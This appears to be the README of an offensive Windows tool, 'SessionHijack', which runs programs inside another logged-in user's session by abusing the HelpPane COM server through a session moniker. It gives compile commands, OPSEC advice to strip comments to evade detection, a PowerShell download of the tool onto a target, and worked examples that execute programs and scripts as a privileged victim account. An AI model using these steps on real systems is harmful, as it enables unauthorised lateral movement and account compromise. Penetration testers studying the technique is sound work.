### SessionHijack
---------------------------------------
This C program enables a user with local administrator rights on a Windows machine to run executables inside the Windows session of any other logged-in user or service account. 
It launches your program in the target session by binding to the HelpPane COM server through a session‑specific moniker and calling its 'Execute()' method. 
The program requires the ID of the target account's session and your program name as input arguments.

It can be particularly useful during internal penetration tests, when you have full control over a Windows server and aim to compromise another privileged account currently logged into the system.

NOTE: Nothing new here, this tool is inspired by and built upon security research and tools developed by others .


#### USAGE
- STEP 1 - Compile the source code.  
<i/> OPSEC advice: remove all existing comments and most 'printf' statements from the source code before compiling. </i>  

```
Example with Visual Studio 2022 Developer Command Prompt
--------------------------------------------------------
Basic:
+ c:\path-to-project\SessionHijack> cl /W4 /EHsc sessionhijack.c /link ole32.lib oleaut32.lib shell32.lib uuid.lib
With an icon:
+ c:\path-to-project\SessionHijack> echo IDI_ICON1 ICON "myicon.ico" > appicon.rc
+ c:\path-to-project\SessionHijack> rc appicon.rc
+ c:\path-to-project\SessionHijack> cl /W4 /EHsc sessionhijack.c /link ole32.lib oleaut32.lib shell32.lib uuid.lib /OUT:sessionhijack.exe appicon.res
```

- STEP 2 - On your target Windows machine, run the command 'query user' or 'qwinsta' to identify the session ID of the other logged-in Windows account (your target) that you want to hijack.  
```
Example on a Windows server 2022
---------------------------------
C:\Temp> qwinsta                     
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         console             1  Active      none   1/1/2026 7:11 PM
 targetprivuser        rdp-tcp#0           2  Active          .  1/1/2026 7:13 PM
```

- STEP 3 - Upload and use the tool 'sessionhijack' to execute programs inside the session of the other logged-in Windows account (your target).
```
Example 1 - Logged as the account 'administrator', we run programs inside the Windows session of the account 'targetprivuser'
-----------------------------------------------------------------------------------------------------------------------------

C:\Temp> powershell -c "wget -uri https://URL/sessionhijack.exe - OutFile C:\temp\sessionhijack.exe"

C:\Temp> sessionhijack.exe 2 notepad.exe
Executing notepad.exe in Session 2

C:\Temp> sessionhijack.exe 2 C:\temp\program.exe
Executing C:\temp\program.exe in Session 2

C:\Temp> tasklist -v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ======== ================ =========== ============ =============== ================================================== ============ ============
<SNIP>                                                                 
notepad.exe                   4232 RDP-Tcp#0                  2     15,668 K Unknown         WINSERVERTEST02\targetprivuser                          0:00:00 N/A
program.exe                   6200 RDP-Tcp#0                  2      4,324 K Unknown         WINSERVERTEST02\targetprivuser                          0:00:00 N/A                                                                     
tasklist.exe                  7292 Console                    1      9,388 K Unknown         WINSERVERTEST02\Administrator                           0:00:00 N/A
                                                                
```
> Note: If you want to run programs with arguments you will need to use scripts (PoSH/Bat/VBS).

```
Example 2 - Logged as the account 'administrator', we run scripts inside the Windows session of the account 'targetprivuser'
---------------------------------------------------------------------------------------------------------------------------

C:\Temp> type script.bat
cmd.exe /c whoami > C:\Temp\whoami.txt

C:\Temp> sessionhijack.exe 2 C:\temp\script.bat
Executing C:\temp\script.bat in Session 2

C:\Temp> type whoami.txt
winservertest02\targetprivuser

```

#### REMINDER
- A COM object is a Windows component that exposes functionality through a well‑defined binary interface so that any programming language can use it.
  It is a reusable, language‑independent object that Windows can load, instantiate, and call at runtime.
- A moniker is a standardized way to describe where the COM object is and how to bind to it. It is a string‑based identifier that points to a COM object.
- A session moniker is a COM moniker that lets you create or access a COM object inside a specific Windows user session.
  It allowes to create COM objects in another user session, call methods inside that session and trigger actions (like launching executables) without duplicating tokens, injecting code, using Windows Terminal Services API, switching desktops.
- The HelpPane COM server happens to support session monikers, so it allows to 'hop' into another session and execute something there.
  HelpPane is one of the very few COM servers in Windows that runs per‑session, allows activation through a session moniker, implements an interface (IHxHelpPaneServer) with a method that launches a file and does not enforce strict security checks on the caller’s session.

#### LICENSE
GNU General Public License v3.0
